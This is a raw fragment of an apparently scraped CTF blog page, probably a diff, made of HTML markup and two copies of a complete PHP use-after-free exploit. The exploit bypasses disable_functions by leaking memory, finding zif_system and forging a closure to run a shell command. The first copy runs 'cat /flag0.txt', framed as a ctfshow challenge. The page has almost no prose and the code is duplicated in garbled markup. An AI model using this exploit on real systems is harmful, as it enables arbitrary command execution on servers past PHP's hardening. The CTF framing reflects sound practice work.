class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ctfshow</span>(<span class="params"><span class="variable">$cmd</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>, <span class="variable">$backtrace</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Vuln</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">            <span class="keyword">global</span> <span class="variable">$backtrace</span>; </span><br><span class="line">            <span class="keyword">unset</span>(<span class="keyword">$this</span>-&gt;a);</span><br><span class="line">            <span class="variable">$backtrace</span> = (<span class="keyword">new</span> <span class="built_in">Exception</span>)-&gt;getTrace();</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>])) &#123;</span><br><span class="line">                <span class="variable">$backtrace</span> = debug_backtrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Helper</span> </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$a</span>, <span class="variable">$b</span>, <span class="variable">$c</span>, <span class="variable">$d</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">str2ptr</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$address</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="variable">$s</span>-<span class="number">1</span>; <span class="variable">$j</span> &gt;= <span class="number">0</span>; <span class="variable">$j</span>--) &#123;</span><br><span class="line">            <span class="variable">$address</span> &lt;&lt;= <span class="number">8</span>;</span><br><span class="line">            <span class="variable">$address</span> |= ord(<span class="variable">$str</span>[<span class="variable">$p</span>+<span class="variable">$j</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$address</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ptr2str</span>(<span class="params"><span class="variable">$ptr</span>, <span class="variable">$m</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$m</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$out</span> .= sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$ptr</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$ptr</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params">&amp;<span class="variable">$str</span>, <span class="variable">$p</span>, <span class="variable">$v</span>, <span class="variable">$n</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$i</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$str</span>[<span class="variable">$p</span> + <span class="variable">$i</span>] = sprintf(<span class="string">&quot;%c&quot;</span>,(<span class="variable">$v</span> &amp; <span class="number">0xff</span>));</span><br><span class="line">            <span class="variable">$v</span> &gt;&gt;= <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"><span class="variable">$addr</span>, <span class="variable">$p</span> = <span class="number">0</span>, <span class="variable">$s</span> = <span class="number">8</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$abc</span>, <span class="variable">$helper</span>;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="number">0x68</span>, <span class="variable">$addr</span> + <span class="variable">$p</span> - <span class="number">0x10</span>);</span><br><span class="line">        <span class="variable">$leak</span> = strlen(<span class="variable">$helper</span>-&gt;a);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$s</span> != <span class="number">8</span>) &#123; <span class="variable">$leak</span> %= <span class="number">2</span> &lt;&lt; (<span class="variable">$s</span> * <span class="number">8</span>) - <span class="number">1</span>; &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">parse_elf</span>(<span class="params"><span class="variable">$base</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$e_type</span> = leak(<span class="variable">$base</span>, <span class="number">0x10</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$e_phoff</span> = leak(<span class="variable">$base</span>, <span class="number">0x20</span>);</span><br><span class="line">        <span class="variable">$e_phentsize</span> = leak(<span class="variable">$base</span>, <span class="number">0x36</span>, <span class="number">2</span>);</span><br><span class="line">        <span class="variable">$e_phnum</span> = leak(<span class="variable">$base</span>, <span class="number">0x38</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$e_phnum</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$header</span> = <span class="variable">$base</span> + <span class="variable">$e_phoff</span> + <span class="variable">$i</span> * <span class="variable">$e_phentsize</span>;</span><br><span class="line">            <span class="variable">$p_type</span>  = leak(<span class="variable">$header</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_flags</span> = leak(<span class="variable">$header</span>, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">            <span class="variable">$p_vaddr</span> = leak(<span class="variable">$header</span>, <span class="number">0x10</span>);</span><br><span class="line">            <span class="variable">$p_memsz</span> = leak(<span class="variable">$header</span>, <span class="number">0x28</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">6</span>) &#123; </span><br><span class="line"></span><br><span class="line">                <span class="variable">$data_addr</span> = <span class="variable">$e_type</span> == <span class="number">2</span> ? <span class="variable">$p_vaddr</span> : <span class="variable">$base</span> + <span class="variable">$p_vaddr</span>;</span><br><span class="line">                <span class="variable">$data_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$p_type</span> == <span class="number">1</span> &amp;&amp; <span class="variable">$p_flags</span> == <span class="number">5</span>) &#123; </span><br><span class="line">                <span class="variable">$text_size</span> = <span class="variable">$p_memsz</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="variable">$data_addr</span> || !<span class="variable">$text_size</span> || !<span class="variable">$data_size</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> [<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_basic_funcs</span>(<span class="params"><span class="variable">$base</span>, <span class="variable">$elf</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">list</span>(<span class="variable">$data_addr</span>, <span class="variable">$text_size</span>, <span class="variable">$data_size</span>) = <span class="variable">$elf</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$data_size</span> / <span class="number">8</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, <span class="variable">$i</span> * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x746e6174736e6f63</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$data_addr</span>, (<span class="variable">$i</span> + <span class="number">4</span>) * <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> - <span class="variable">$base</span> &gt; <span class="number">0</span> &amp;&amp; <span class="variable">$leak</span> - <span class="variable">$base</span> &lt; <span class="variable">$data_addr</span> - <span class="variable">$base</span>) &#123;</span><br><span class="line">                <span class="variable">$deref</span> = leak(<span class="variable">$leak</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$deref</span> != <span class="number">0x786568326e6962</span>)</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$data_addr</span> + <span class="variable">$i</span> * <span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-PHP" data-language="PHP"><code class="language-PHP">&lt;?php
+function ctfshow($cmd) &#123;
+    global $abc, $helper, $backtrace;
+
+    class Vuln &#123;
+        public $a;
+        public function __destruct() &#123; 
+            global $backtrace; 
+            unset($this-&gt;a);
+            $backtrace &#x3D; (new Exception)-&gt;getTrace();
+            if(!isset($backtrace[1][&#39;args&#39;])) &#123;
+                $backtrace &#x3D; debug_backtrace();
+            &#125;
+        &#125;
+    &#125;
+
+    class Helper &#123;
+        public $a, $b, $c, $d;
+    &#125;
+
+    function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123;
+        $address &#x3D; 0;
+        for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123;
+            $address &lt;&lt;&#x3D; 8;
+            $address |&#x3D; ord($str[$p+$j]);
+        &#125;
+        return $address;
+    &#125;
+
+    function ptr2str($ptr, $m &#x3D; 8) &#123;
+        $out &#x3D; &quot;&quot;;
+        for ($i&#x3D;0; $i &lt; $m; $i++) &#123;
+            $out .&#x3D; sprintf(&quot;%c&quot;,($ptr &amp; 0xff));
+            $ptr &gt;&gt;&#x3D; 8;
+        &#125;
+        return $out;
+    &#125;
+
+    function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123;
+        $i &#x3D; 0;
+        for($i &#x3D; 0; $i &lt; $n; $i++) &#123;
+            $str[$p + $i] &#x3D; sprintf(&quot;%c&quot;,($v &amp; 0xff));
+            $v &gt;&gt;&#x3D; 8;
+        &#125;
+    &#125;
+
+    function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123;
+        global $abc, $helper;
+        write($abc, 0x68, $addr + $p - 0x10);
+        $leak &#x3D; strlen($helper-&gt;a);
+        if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125;
+        return $leak;
+    &#125;
+
+    function parse_elf($base) &#123;
+        $e_type &#x3D; leak($base, 0x10, 2);
+
+        $e_phoff &#x3D; leak($base, 0x20);
+        $e_phentsize &#x3D; leak($base, 0x36, 2);
+        $e_phnum &#x3D; leak($base, 0x38, 2);
+
+        for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123;
+            $header &#x3D; $base + $e_phoff + $i * $e_phentsize;
+            $p_type  &#x3D; leak($header, 0, 4);
+            $p_flags &#x3D; leak($header, 4, 4);
+            $p_vaddr &#x3D; leak($header, 0x10);
+            $p_memsz &#x3D; leak($header, 0x28);
+
+            if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; 
+
+                $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr;
+                $data_size &#x3D; $p_memsz;
+            &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; 
+                $text_size &#x3D; $p_memsz;
+            &#125;
+        &#125;
+
+        if(!$data_addr || !$text_size || !$data_size)
+            return false;
+
+        return [$data_addr, $text_size, $data_size];
+    &#125;
+
+    function get_basic_funcs($base, $elf) &#123;
+        list($data_addr, $text_size, $data_size) &#x3D; $elf;
+        for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123;
+            $leak &#x3D; leak($data_addr, $i * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref &#x3D; leak($leak);
+                
+                if($deref !&#x3D; 0x746e6174736e6f63)
+                    continue;
+            &#125; else continue;
+
+            $leak &#x3D; leak($data_addr, ($i + 4) * 8);
+            if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123;
+                $deref &#x3D; leak($leak);
+                
+                if($deref !&#x3D; 0x786568326e6962)
+                    continue;
+            &#125; else continue;
+
+            return $data_addr + $i * 8;
+        &#125;
+    &#125;
+
+    function get_binary_base($binary_leak) &#123;
+        $base &#x3D; 0;
+        $start &#x3D; $binary_leak &amp; 0xfffffffffffff000;
+        for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123;
+            $addr &#x3D; $start - 0x1000 * $i;
+            $leak &#x3D; leak($addr, 0, 7);
+            if($leak &#x3D;&#x3D; 0x10102464c457f) &#123;
+                return $addr;
+            &#125;
+        &#125;
+    &#125;
+
+    function get_system($basic_funcs) &#123;
+        $addr &#x3D; $basic_funcs;
+        do &#123;
+            $f_entry &#x3D; leak($addr);
+            $f_name &#x3D; leak($f_entry, 0, 6);
+
+            if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123;
+                return leak($addr + 8);
+            &#125;
+            $addr +&#x3D; 0x20;
+        &#125; while($f_entry !&#x3D; 0);
+        return false;
+    &#125;
+
+    function trigger_uaf($arg) &#123;
+
+        $arg &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+        $vuln &#x3D; new Vuln();
+        $vuln-&gt;a &#x3D; $arg;
+    &#125;
+
+    if(stristr(PHP_OS, &#39;WIN&#39;)) &#123;
+        die(&#39;This PoC is for *nix systems only.&#39;);
+    &#125;
+
+    $n_alloc &#x3D; 10; 
+    $contiguous &#x3D; [];
+    for($i &#x3D; 0; $i &lt; $n_alloc; $i++)
+        $contiguous[] &#x3D; str_shuffle(&#39;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#39;);
+
+    trigger_uaf(&#39;x&#39;);
+    $abc &#x3D; $backtrace[1][&#39;args&#39;][0];
+
+    $helper &#x3D; new Helper;
+    $helper-&gt;b &#x3D; function ($x) &#123; &#125;;
+
+    if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123;
+        die(&quot;UAF failed&quot;);
+    &#125;
+
+    $closure_handlers &#x3D; str2ptr($abc, 0);
+    $php_heap &#x3D; str2ptr($abc, 0x58);
+    $abc_addr &#x3D; $php_heap - 0xc8;
+
+    write($abc, 0x60, 2);
+    write($abc, 0x70, 6);
+
+    write($abc, 0x10, $abc_addr + 0x60);
+    write($abc, 0x18, 0xa);
+
+    $closure_obj &#x3D; str2ptr($abc, 0x20);
+
+    $binary_leak &#x3D; leak($closure_handlers, 8);
+    if(!($base &#x3D; get_binary_base($binary_leak))) &#123;
+        die(&quot;Couldn&#39;t determine binary base address&quot;);
+    &#125;
+
+    if(!($elf &#x3D; parse_elf($base))) &#123;
+        die(&quot;Couldn&#39;t parse ELF header&quot;);
+    &#125;
+
+    if(!($basic_funcs &#x3D; get_basic_funcs($base, $elf))) &#123;
+        die(&quot;Couldn&#39;t get basic_functions address&quot;);
+    &#125;
+
+    if(!($zif_system &#x3D; get_system($basic_funcs))) &#123;
+        die(&quot;Couldn&#39;t get zif_system address&quot;);
+    &#125;
+
+
+    $fake_obj_offset &#x3D; 0xd0;
+    for($i &#x3D; 0; $i &lt; 0x110; $i +&#x3D; 8) &#123;
+        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
+    &#125;
+
+    write($abc, 0x20, $abc_addr + $fake_obj_offset);
+    write($abc, 0xd0 + 0x38, 1, 4); 
+    write($abc, 0xd0 + 0x68, $zif_system); 
+
+    ($helper-&gt;b)($cmd);
+    exit();
+&#125;
+
